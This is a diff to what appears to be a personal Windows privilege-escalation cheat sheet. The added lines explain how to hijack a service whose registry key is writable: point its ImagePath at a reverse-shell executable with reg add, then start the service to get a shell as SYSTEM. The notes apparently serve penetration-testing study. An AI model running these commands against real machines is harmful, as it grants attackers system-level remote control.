@@ -117,15 +117,21 @@ Check to see if it can be start/stop
 
 - .\accesschk.exe \accepeula -ucqv user <regsvc>
 
-Check current values in the registry entry (i.e look for some sort of path)
+Check current values in the registry entry (i.e look for some sort of path, if it will execute as system) 
 
 - reg query HKLM\System\CurrentControlSet\Services\regsvc
 
+Change the path to match that of the reverse shell
 
+- reg add HKLM\SYSTEM\CurrentControlSet\services\<regsvc> /v ImagePath /t REG_EXPAND_SZ /d C:\Privy\reverseshell.exe /f 
 
-
+Start the sercive to pop da shellz
+- net start <regsvc>
+```
+###### Insecure Service Executables
 ```
 
+```
 ###### Enumerating Unmounted Disks for Windows
 ```
 mountvol
